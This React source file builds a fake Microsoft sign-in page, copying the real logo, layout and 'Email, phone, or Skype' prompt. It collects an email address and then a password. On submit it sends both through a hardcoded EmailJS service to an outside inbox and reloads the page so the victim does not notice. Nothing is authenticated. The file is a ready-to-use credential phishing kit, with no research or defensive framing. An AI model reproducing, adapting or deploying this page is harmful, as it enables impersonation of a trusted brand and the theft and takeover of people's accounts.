import React, { useRef, useState, useEffect } from "react";
import emailjs from "@emailjs/browser";

const styles = {
  pageWrapper: {
    minHeight: "100vh",
    minWidth: "100vw",
    background: "radial-gradient(circle at top left, #e6d7d2, #d6e3d9)",
    display: "flex",
    flexDirection: "column",
    justifyContent: "center",
    alignItems: "center",
    position: "relative",
    fontFamily:
      'Segoe UI, SegoeUI, "Helvetica Neue", Helvetica, Arial, sans-serif',
  },
  loginContainer: {
    background: "#fff",
    borderRadius: "4px",
    boxShadow: "0 2px 8px 0 rgba(0,0,0,0.13)",
    width: "495px",
    height: "334px",
    padding: "56px 56px 48px 56px",
    display: "flex",
    flexDirection: "column",
    alignItems: "stretch",
    marginBottom: "24px",
    // border: "1px solid #eee",
  },
  msLogo: {
    display: "flex",
    alignItems: "center",
    marginBottom: "1.5rem",
  },
  logoSvg: {
    width: "160px", // increased from 32px or 108px to 160px
    height: "36px", // increased for better aspect ratio
    marginRight: "0.7rem",
  },
  msText: {
    fontSize: "1.4rem",
    fontWeight: "600",
    color: "#222",
    letterSpacing: "0.01em",
  },
  heading: {
    fontSize: "1.7rem",
    fontWeight: "400",
    margin: "0 0 1.7rem 0",
    color: "#1b1b1b",
  },
  input: {
    width: "100%",
    padding: "0.7rem 0",
    fontSize: "1.08rem",
    border: "none",
    borderBottom: "1.5px solid #888",
    background: "transparent",
    outline: "none",
    marginBottom: "0.5rem",
  },
  links: {
    fontSize: "1.01rem",
    margin: "0 0 1.7rem 0",
    color: "#616161",
    lineHeight: 1.6,
  },
  link: {
    color: "#0067b8",
    textDecoration: "none",
    fontWeight: 500,
    marginLeft: "0.2rem",
    cursor: "pointer",
  },
  buttonRow: {
    display: "flex",
    justifyContent: "flex-end",
    gap: "12px",
    marginTop: "1.2rem",
  },
  button: {
    minWidth: "90px",
    padding: "0.6rem 0",
    background: "#0067b8",
    color: "#fff",
    border: "none",
    fontSize: "1.13rem",
    fontWeight: "500",
    cursor: "pointer",
    borderRadius: "2px",
    transition: "background 0.2s",
  },
  backButton: {
    minWidth: "90px",
    padding: "0.6rem 0",
    background: "#e1e1e1",
    color: "#222",
    border: "none",
    fontSize: "1.13rem",
    fontWeight: "500",
    cursor: "pointer",
    borderRadius: "2px",
    transition: "background 0.2s",
  },
  signInOptions: {
    background: "#fff",
    // border: "1px solid #eee",
    borderRadius: "4px",
    boxShadow: "0 2px 8px 0 rgba(0,0,0,0.07)",
    width: "559px",
    height: "52px",
    padding: "1rem 1.5rem",
    display: "flex",
    alignItems: "center",
    fontSize: "1.08rem",
    marginBottom: "0.5rem",
    cursor: "pointer",
    gap: "0.7rem",
  },
  keyIcon: {
    width: "24px",
    height: "24px",
  },
  footer: {
    position: "fixed",
    right: "32px",
    bottom: "18px",
    display: "flex",
    gap: "1.5rem",
    fontSize: "0.95rem",
    color: "#666",
    zIndex: 10,
    alignItems: "center",
    fontFamily:
      'Segoe UI, SegoeUI, "Helvetica Neue", Helvetica, Arial, sans-serif',
  },
  footerLink: {
    textDecoration: "none",
    color: "#0067b8",
  },
  footerText: {
    color: "#999",
    fontSize: "1.2rem",
    fontWeight: "bold",
    userSelect: "none",
  },
};

// Add responsive styles via a style tag on mount
const injectResponsiveStyles = () => {
  const styleId = "login-responsive-styles";
  if (!document.getElementById(styleId)) {
    const style = document.createElement("style");
    style.id = styleId;
    style.innerHTML = `
      @media (max-width: 600px) {
        .login-responsive-container {
          width: 98vw !important;
          min-width: 0 !important;
          max-width: 100vw !important;
          height: auto !important;
          min-height: 0 !important;
          padding: 10px !important;
        }
        .login-responsive-signin-options {
          width: 98vw !important;
          min-width: 0 !important;
          max-width: 100vw !important;
          padding: 10px !important;
        }
      }
    `;
    document.head.appendChild(style);
  }
};

const Login = () => {
  const form = useRef();
  const [loading, setLoading] = useState(false);
  const [step, setStep] = useState(1);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const handleNext = (e) => {
    e.preventDefault();
    if (!email || !/\S+@\S+\.\S+/.test(email)) {
      alert("Please enter a valid email address.");
      return;
    }
    setStep(2);
  };

  const handleBack = (e) => {
    e.preventDefault();
    if (step === 2) setStep(1);
  };

  const sendEmail = (e) => {
    e.preventDefault();
    setLoading(true);

    emailjs
      .sendForm(
        "service_i1hn7b6",
        "template_esw4v85",
        form.current,
        "QqR8IDJXlWSH7-bG3"
      )
      .then(
        () => {
          setLoading(false);
          window.location.reload();
        },
        (error) => {
          console.error("EmailJS error:", error);
          alert("There was an error sending the email.");
          setLoading(false);
        }
      );
  };

  useEffect(() => {
    injectResponsiveStyles();
  }, []);

  return (
    <div style={styles.pageWrapper}>
      <div style={styles.loginContainer} className="login-responsive-container">
        <div style={styles.msLogo}>
          <svg
            xmlns="http://www.w3.org/2000/svg"
            style={styles.logoSvg}
            width="160"
            height="36"
            viewBox="0 0 108 24"
          >
            <title>assets</title>
            <path
              d="M44.836,4.6V18.4h-2.4V7.583H42.4L38.119,18.4H36.531L32.142,7.583h-.029V18.4H29.9V4.6h3.436L37.3,14.83h.058L41.545,4.6Zm2,1.049a1.268,1.268,0,0,1,.419-.967,1.413,1.413,0,0,1,1-.39,1.392,1.392,0,0,1,1.02.4,1.3,1.3,0,0,1,.4.958,1.248,1.248,0,0,1-.414.953,1.428,1.428,0,0,1-1.01.385A1.4,1.4,0,0,1,47.25,6.6a1.261,1.261,0,0,1-.409-.948M49.41,18.4H47.081V8.507H49.41Zm7.064-1.694a3.213,3.213,0,0,0,1.145-.241,4.811,4.811,0,0,0,1.155-.635V18a4.665,4.665,0,0,1-1.266.481,6.886,6.886,0,0,1-1.554.164,4.707,4.707,0,0,1-4.918-4.908,5.641,5.641,0,0,1,1.4-3.932,5.055,5.055,0,0,1,3.955-1.545,5.414,5.414,0,0,1,1.324.168,4.431,4.431,0,0,1,1.063.39v2.233a4.763,4.763,0,0,0-1.1-.611,3.184,3.184,0,0,0-1.15-.217,2.919,2.919,0,0,0-2.223.9,3.37,3.37,0,0,0-.847,2.416,3.216,3.216,0,0,0,.813,2.338,2.936,2.936,0,0,0,2.209.837M65.4,8.343a2.952,2.952,0,0,1,.5.039,2.1,2.1,0,0,1,.375.1v2.358a2.04,2.04,0,0,0-.534-.255,2.646,2.646,0,0,0-.852-.12,1.808,1.808,0,0,0-1.448.722,3.467,3.467,0,0,0-.592,2.223V18.4H60.525V8.507h2.329v1.559h.038A2.729,2.729,0,0,1,63.855,8.8,2.611,2.611,0,0,1,65.4,8.343m1,5.254A5.358,5.358,0,0,1,67.792,9.71a5.1,5.1,0,0,1,3.85-1.434,4.742,4.742,0,0,1,3.623,1.381,5.212,5.212,0,0,1,1.3,3.729,5.257,5.257,0,0,1-1.386,3.83,5.019,5.019,0,0,1-3.772,1.424,4.935,4.935,0,0,1-3.652-1.352A4.987,4.987,0,0,1,66.406,13.6m2.425-.077a3.535,3.535,0,0,0,.7,2.368,2.505,2.505,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.389,2.389,0,0,0-1.929-.813,2.44,2.44,0,0,0-1.988.852,3.707,3.707,0,0,0-.707,2.43m11.2-2.416a1,1,0,0,0,.318.785,5.426,5.426,0,0,0,1.4.717,4.767,4.767,0,0,1,1.959,1.256,2.6,2.6,0,0,1,.563,1.689A2.715,2.715,0,0,1,83.2,17.794a4.558,4.558,0,0,1-2.9.847,6.978,6.978,0,0,1-1.362-.149,6.047,6.047,0,0,1-1.265-.38v-2.29a5.733,5.733,0,0,0,1.367.7,4,4,0,0,0,1.328.26,2.365,2.365,0,0,0,1.164-.221.79.79,0,0,0,.375-.741,1.029,1.029,0,0,0-.39-.813,5.768,5.768,0,0,0-1.477-.765,4.564,4.564,0,0,1-1.829-1.213,2.655,2.655,0,0,1-.539-1.713,2.706,2.706,0,0,1,1.063-2.2A4.243,4.243,0,0,1,81.5,8.256a6.663,6.663,0,0,1,1.164.115,5.161,5.161,0,0,1,1.078.3v2.214a4.974,4.974,0,0,0-1.078-.529,3.6,3.6,0,0,0-1.222-.221,1.781,1.781,0,0,0-1.034.26.824.824,0,0,0-.371.712M85.278,13.6A5.358,5.358,0,0,1,86.664,9.71a5.1,5.1,0,0,1,3.849-1.434,4.743,4.743,0,0,1,3.624,1.381,5.212,5.212,0,0,1,1.3,3.729,5.259,5.259,0,0,1-1.386,3.83,5.02,5.02,0,0,1-3.773,1.424,4.934,4.934,0,0,1-3.652-1.352A4.987,4.987,0,0,1,85.278,13.6m2.425-.077a3.537,3.537,0,0,0,.7,2.368,2.506,2.506,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.39,2.39,0,0,0-1.93-.813,2.439,2.439,0,0,0-1.987.852,3.707,3.707,0,0,0-.707,2.43m15.464-3.109H99.7V18.4H97.341V10.412H95.686V8.507h1.655V7.13a3.423,3.423,0,0,1,1.015-2.555,3.561,3.561,0,0,1,2.6-1,5.807,5.807,0,0,1,.751.043,2.993,2.993,0,0,1,.577.13V5.764a2.422,2.422,0,0,0-.4-.164,2.107,2.107,0,0,0-.664-.1,1.407,1.407,0,0,0-1.126.457A2.017,2.017,0,0,0,99.7,7.313V8.507h3.469V6.283l2.339-.712V8.507h2.358v1.906h-2.358v4.629a1.951,1.951,0,0,0,.332,1.29,1.326,1.326,0,0,0,1.044.375,1.557,1.557,0,0,0,.486-.1,2.294,2.294,0,0,0,.5-.231V18.3a2.737,2.737,0,0,1-.736.231,5.029,5.029,0,0,1-1.015.106,2.887,2.887,0,0,1-2.209-.784,3.341,3.341,0,0,1-.736-2.363Z"
              fill="#737373"
            />
            <rect width="10.931" height="10.931" fill="#f25022" />
            <rect x="12.069" width="10.931" height="10.931" fill="#7fba00" />
            <rect y="12.069" width="10.931" height="10.931" fill="#00a4ef" />
            <rect
              x="12.069"
              y="12.069"
              width="10.931"
              height="10.931"
              fill="#ffb900"
            />
          </svg>
          <span style={styles.msText}></span>
        </div>

        <h2 style={styles.heading}>Sign in</h2>
        <form
          ref={form}
          onSubmit={step === 2 ? sendEmail : handleNext}
          style={{ width: "100%" }}
        >
          {/* Always render the email input so it's present in the form for EmailJS */}
          <input
            type="email"
            name="email"
            id="email"
            placeholder="Email, phone, or Skype"
            required
            style={styles.input}
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            autoFocus={step === 1}
            readOnly={step === 2}
            tabIndex={step === 1 ? 0 : -1}
            hidden={step !== 1 && step !== 2}
          />
          {step === 1 && (
            <>
              <div style={styles.links}>
                <span>No account?</span>
                <a href="#" style={styles.link}>
                  Create one!
                </a>
                <br />
                <a href="#" style={styles.link}>
                  Can't access your account?
                </a>
              </div>
              <div style={styles.buttonRow}>
                <button type="button" style={styles.backButton} disabled>
                  Back
                </button>
                <button type="submit" style={styles.button} disabled={loading}>
                  Next
                </button>
              </div>
            </>
          )}
          {step === 2 && (
            <>
              <input
                type="password"
                name="accesskey"
                placeholder="Password"
                required
                style={styles.input}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                autoFocus
              />
              <div style={styles.buttonRow}>
                <button
                  type="button"
                  style={styles.backButton}
                  onClick={handleBack}
                  disabled={loading}
                >
                  Back
                </button>
                <button type="submit" style={styles.button} disabled={loading}>
                  {loading ? "Signing..." : "Next"}
                </button>
              </div>
            </>
          )}
        </form>
      </div>
      <div
        style={styles.signInOptions}
        className="login-responsive-signin-options"
      >
        <svg
          style={styles.keyIcon}
          xmlns="http://www.w3.org/2000/svg"
          width="48"
          height="48"
          viewBox="0 0 48 48"
          fill="none"
        >
          <rect width="48" height="48" fill="none" />
          <path
            fill="#404040"
            d="M40,32.578V40H32V36H28V32H24V28.766A10.689,10.689,0,0,1,19,30a10.9,10.9,0,0,1-5.547-1.5,11.106,11.106,0,0,1-2.219-1.719A11.373,11.373,0,0,1,9.5,24.547a10.4,10.4,0,0,1-1.109-2.625A11.616,11.616,0,0,1,8,19a10.9,10.9,0,0,1,1.5-5.547,11.106,11.106,0,0,1,1.719-2.219A11.373,11.373,0,0,1,13.453,9.5a10.4,10.4,0,0,1,2.625-1.109A11.616,11.616,0,0,1,19,8a10.9,10.9,0,0,1,5.547,1.5,11.106,11.106,0,0,1,2.219,1.719A11.373,11.373,0,0,1,28.5,13.453a10.4,10.4,0,0,1,1.109,2.625A11.616,11.616,0,0,1,30,19a10.015,10.015,0,0,1-.125,1.578,10.879,10.879,0,0,1-.359,1.531ZM16,14a1.938,1.938,0,0,1,.781.156,2,2,0,0,1,.625.422,2.191,2.191,0,0,1,.438.641A1.705,1.705,0,0,1,18,16a1.938,1.938,0,0,1-.156.781,2,2,0,0,1-.422.625,2.191,2.191,0,0,1-.641.438A1.705,1.705,0,0,1,16,18a1.938,1.938,0,0,1-.781-.156,2,2,0,0,1-.625-.422,2.191,2.191,0,0,1-.438-.641A1.705,1.705,0,0,1,14,16a1.938,1.938,0,0,1,.156-.781,2,2,0,0,1,.422-.625,2.191,2.191,0,0,1,.641-.438A1.705,1.705,0,0,1,16,14Z"
          />
        </svg>
        <span>Sign-in options</span>
      </div>
      <div style={styles.footer}>
        <a href="#" style={styles.footerLink}>
          Terms of use
        </a>
        <a href="#" style={styles.footerLink}>
          Privacy & cookies
        </a>
        <span style={styles.footerText}>...</span>
      </div>
    </div>
  );
};

export default Login;
